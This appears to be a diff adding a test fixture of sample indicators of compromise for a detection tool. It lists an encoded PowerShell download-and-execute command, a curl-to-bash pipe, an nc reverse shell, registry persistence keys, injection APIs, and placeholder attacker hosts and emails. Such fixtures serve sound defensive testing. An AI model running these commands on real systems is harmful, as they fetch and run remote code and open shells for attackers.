@@ -1,0 +1,31 @@
+This is a test file containing suspicious indicators for demonstration.
+
+URLs:
+http://malicious-c2-server.com/payload
+https://evil-site.net/download
+
+IP Addresses:
+192.168.1.100
+10.0.0.50
+
+PowerShell commands:
+powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiA2xpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAEQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQAgAHwAIABJAE4AVgBPAEsARQAtAEUAeABwAHIAZQBzAHMAaQBvAG4A
+Invoke-Expression -WindowStyle Hidden
+
+Registry:
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
+
+DLL Injection APIs:
+VirtualAlloc
+WriteProcessMemory
+CreateRemoteThread
+
+Network tools:
+wget http://example.com/file -O /tmp/file
+curl -s http://example.com/script | bash
+nc -e /bin/sh 192.168.1.100 4444
+
+Email:
+attacker@evil-domain.com
+phishing@fake-bank.net
